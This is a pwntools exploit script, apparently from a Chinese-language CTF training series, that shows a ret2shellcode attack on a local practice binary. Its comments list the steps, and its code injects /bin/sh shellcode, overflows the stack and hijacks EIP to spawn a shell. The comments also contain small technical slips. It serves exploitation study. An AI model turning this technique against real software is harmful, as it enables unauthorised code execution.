from pwn import *

'''
    PWN 第二章 ShellCode
    
    此章节要点:
        程序无system('/bin/sh')后门函数, 但bss段可读写执行, 可以往BSS段注入shellcode实现pwn

    ShellCode实现方式:
        1.找到程序片段中可写可执行内存区域（RWX）,并且确保该片段没有随机内存地址(ASMR、Canary)保护
        2.找到该RWX内存区域注入、溢出点
        3.将RWX内存区域注入ShellCode代码片段
        4.定位栈帧溢出点到栈帧临近存放EIP值的距离
        5.劫持栈帧EIP值, 将程序控制流跳转至ShellCode
'''


def ret2_shellcode1(file_name='/mnt/hgfs/CyberSecurity/PWN/ROP/ret2shellcode'):
    print('call ret2shellcode1 start\n')
    try:
        io = process([file_name])

        io.recvline()

        # 指定目标环境
        context(log_level='debug', arch='i386', os='linux')
        # context(log_level='debug', arch='amd64', os='linux')

        payload = asm(shellcraft.sh()) + b'A' * 68 + p32(0x0804A080)

        gdb.attach(io)

        io.sendline(payload)

        io.interactive()
    except Exception:
        return False
    finally:
        print('call ret2shellcode1 end\n\n')

    return True


if __name__ == '__main__':
    ret2_shellcode1()
